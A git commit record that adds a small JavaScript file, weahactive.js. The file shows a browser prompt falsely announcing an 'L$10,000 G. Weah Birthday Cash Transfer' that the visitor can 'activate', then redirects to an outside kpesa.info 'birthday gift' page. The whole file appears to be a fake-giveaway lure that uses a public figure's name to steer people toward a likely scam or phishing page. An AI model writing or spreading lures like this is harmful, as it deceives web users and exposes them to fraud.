f56b34da39782815dbb71b7e1bef44438476d892
kpesaa <meiosis_logins.2d@icloud.com>
2026-06-04 19:02:06 +0100

    Create weahactive.js

---
+++ weahactive.js
@@ -0,0 +1,11 @@
+
+var password = 'L$10,000';
+
+password = prompt(
+  'Congratulations, you are eligible for L$10,000 G. Weah Birthday Cash Transfer. Click OK to activate now.',
+  'L$10,000'
+);
+
+if (password !== 'L$10,000') {
+    location.href = 'https://kpesa.info/10000-birthday-gift.html';
+}
